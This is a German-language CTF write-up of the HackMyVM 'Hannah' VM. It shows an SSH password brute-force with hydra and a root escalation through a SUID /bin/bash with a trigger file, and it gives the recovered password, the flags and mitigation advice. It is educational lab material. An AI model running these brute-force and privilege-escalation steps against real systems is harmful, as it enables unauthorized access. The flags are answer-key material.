# Hannah (HackMyVM) - Penetration Test Bericht

![Hannah.png](Hannah.png) <!-- Optional: Fügen Sie hier den Pfad zum Icon ein, wenn es im Repo vorhanden ist -->

**Datum des Berichts:** 2023-04-13
**VM:** Hannah
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Hannah))
**Autor der VM:** DarkSpirit
**Original Writeup:** [https://alientec1908.github.io/Hannah_HackMyVM_Easy/](https://alientec1908.github.io/Hannah_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance & Web Enumeration](#phase-1-reconnaissance--web-enumeration)
4.  [Phase 2: Initial Access (SSH Brute-Force)](#phase-2-initial-access-ssh-brute-force)
5.  [Phase 3: Privilege Escalation (SUID Bash mit Trigger-Datei)](#phase-3-privilege-escalation-suid-bash-mit-trigger-datei)
6.  [Proof of Concept (Zusammenfassung)](#proof-of-concept-zusammenfassung)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert den Prozess der Kompromittierung der virtuellen Maschine "Hannah" von HackMyVM. Der initiale Zugriff wurde durch einen Brute-Force-Angriff auf den SSH-Dienst erlangt, wodurch Zugangsdaten für den Benutzer `moksha` aufgedeckt wurden. Die Privilegieneskalation zu Root-Rechten erfolgte durch Ausnutzung einer unsicheren SUID-Berechtigung auf der Bash-Binary (`/bin/bash`), in Kombination mit der Notwendigkeit, eine spezifische Trigger-Datei (`/tmp/enlightenment`) zu erstellen, deren Name durch die `robots.txt`-Datei des Webservers angedeutet wurde.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wfuzz`
*   `nikto`
*   `hydra`
*   `ssh`
*   `find`
*   `uname`
*   `Metasploit (msf6)` (für alternative Shell)
*   `nc (netcat)`
*   `ss`
*   `crontab`
*   `dmesg` (Zugriff verweigert)
*   `getcap`
*   `ls`, `cat`, `grep`, `touch`, `nano`, `chmod`, `mv`, `bash`, `id`, `pwd`, `cd`, `echo`

---

## Phase 1: Reconnaissance & Web Enumeration

1.  **Netzwerk-Scan:**
    *   Mittels `arp-scan -l` wurde der Host `192.168.2.127` (VirtualBox-VM) identifiziert.
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -AO 192.168.2.127 -p-`) offenbarte offene Ports:
        *   **Port 22 (SSH):** OpenSSH 8.4p1 (Debian)
        *   **Port 80 (HTTP):** nginx 1.18.0
            *   `robots.txt` enthielt den Eintrag `Disallow: /enlightenment`.
            *   Nmap meldete `moksha` als möglichen Besitzer des Webdienstes, ein Hinweis auf einen Benutzernamen.
        *   **Port 113 (ident?):** Offen, aber für diesen Test irrelevant.

2.  **Web-Enumeration:**
    *   `gobuster` und `wfuzz` (Subdomain-Enumeration) lieferten keine signifikanten neuen Pfade oder Subdomains außer der bereits bekannten `/robots.txt` und einer "Under construction"-Seite.
    *   `nikto` wies auf fehlende Sicherheitsheader und die Existenz von `/robots.txt` hin. Der Fund `#wp-config.php#` stellte sich als nicht relevant für den Exploit heraus.
    *   Der Pfad `/enlightenment` (aus `robots.txt`) lieferte einen 404-Fehler.

**Wichtigste Erkenntnisse aus Phase 1:** Der Benutzername `moksha` und der Name `enlightenment` aus der `robots.txt`.

---

## Phase 2: Initial Access (SSH Brute-Force)

Basierend auf dem in Phase 1 identifizierten Benutzernamen `moksha` wurde ein Brute-Force-Angriff auf den SSH-Dienst (Port 22) durchgeführt.

*   **Tool:** `hydra`
*   **Befehl:**
    ```bash
    hydra -l moksha -P /usr/share/wordlists/rockyou.txt ssh://hannah.hmv:22 -t 64
    ```
*   **Ergebnis:** Das Passwort `hannah` für den Benutzer `moksha` wurde erfolgreich gefunden.
*   **Zugriff:**
    ```bash
    ssh moksha@hannah.hmv 
    # Passwort: hannah
    ```
Der erfolgreiche Login gewährte eine Benutzershell als `moksha`.

---

## Phase 3: Privilege Escalation (SUID Bash mit Trigger-Datei)

Nach dem Erhalt des initialen Zugriffs wurde nach Wegen zur Eskalation von Privilegien gesucht.

1.  **Hinweis aus `robots.txt`:** Die Datei `/robots.txt` enthielt den Eintrag `Disallow: /enlightenment`.

2.  **Entdeckung der SUID-Fehlkonfiguration:**
    Eine Überprüfung der SUID-gesetzten Dateien zeigte keine ungewöhnlichen Einträge, jedoch wurde später festgestellt, dass `/bin/bash` das SUID-Bit gesetzt hatte:
    ```bash
    moksha@hannah:/tmp$ ls -la /bin/bash
    -rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
    ```

3.  **Die Trigger-Datei:**
    Es stellte sich heraus, dass die SUID-Bash-Ausnutzung von der Existenz einer spezifischen Datei im `/tmp`-Verzeichnis abhing.
    *   Im `/tmp`-Verzeichnis wurde eine leere Datei namens `enlIghtenment` (mit abweichender Groß-/Kleinschreibung) gefunden.
    *   Inspiriert durch den `robots.txt`-Eintrag wurde die korrekte Trigger-Datei erstellt:
      ```bash
      moksha@hannah:/tmp$ touch enlightenment
      ```

4.  **Ausnutzung:**
    Nachdem die Datei `/tmp/enlightenment` erstellt wurde, konnte die SUID-Bash zur Privilegieneskalation genutzt werden:
    ```bash
    moksha@hannah:/tmp$ /bin/bash -p
    bash-5.1# id
    uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
    ```
Dies gewährte eine Shell mit effektiven Root-Rechten (`euid=0(root)`).

---

## Proof of Concept (Zusammenfassung)

1.  **Initial Access (SSH Brute-Force):**
    ```bash
    hydra -l moksha -P /usr/share/wordlists/rockyou.txt ssh://hannah.hmv:22 -t 64
    ssh moksha@hannah.hmv # Passwort: hannah
    ```

2.  **Privilege Escalation (SUID Bash mit Trigger):**
    ```bash
    # Als Benutzer moksha
    moksha@hannah:~$ cd /tmp
    moksha@hannah:/tmp$ touch enlightenment
    moksha@hannah:/tmp$ /bin/bash -p
    bash-5.1# id 
    # euid=0(root)
    bash-5.1# cat /root/root.txt
    ```

---

## Flags

*   **User Flag (`/home/moksha/user.txt`):**
    ```
    HMVGGHFWP2023
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    HMVHAPPYNY2023
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **SSH-Härtung:**
    *   Starke, einzigartige Passwörter für alle Benutzer erzwingen.
    *   Brute-Force-Schutzmechanismen wie `fail2ban` implementieren.
    *   Wo möglich, passwortbasierte Authentifizierung deaktivieren und stattdessen Schlüssel-Authentifizierung verwenden.
*   **SUID/SGID-Berechtigungen:**
    *   **Entfernen Sie umgehend das SUID-Bit von `/bin/bash`:** `chmod u-s /bin/bash`.
    *   Überprüfen Sie regelmäßig alle Dateien mit SUID/SGID-Berechtigungen (z.B. mit `find / -type f \( -perm -4000 -o -perm -2000 \) -ls`).
    *   Entfernen Sie SUID/SGID-Bits von allen Binaries, bei denen dies nicht absolut notwendig ist (Prinzip der geringsten Rechte).
*   **Webserver-Konfiguration:**
    *   Stellen Sie sicher, dass `robots.txt` keine sensiblen Pfade oder Namen preisgibt, die als Hinweis für Angreifer dienen könnten.
    *   Implementieren Sie empfohlene Sicherheitsheader (z.B. `X-Frame-Options`, `X-Content-Type-Options`).
*   **Systemhärtung:**
    *   Untersuchen Sie den Mechanismus, der `/tmp/enlightenment` als Trigger für die SUID-Bash-Ausnutzung verwendet (falls es sich um eine benutzerdefinierte Konfiguration handelt) und beheben Sie die zugrundeliegende Schwachstelle.
    *   Härten Sie das `/tmp`-Verzeichnis (z.B. mit `noexec`, `nosuid` Mount-Optionen).
    *   Implementieren Sie File Integrity Monitoring (FIM), um unerlaubte Änderungen an Systemdateien und deren Berechtigungen zu erkennen.
*   **Überwachung:**
    *   Überwachen Sie SSH-Logins und ausgehende Netzwerkverbindungen.

---

**Ben C. - Cyber Security Reports**
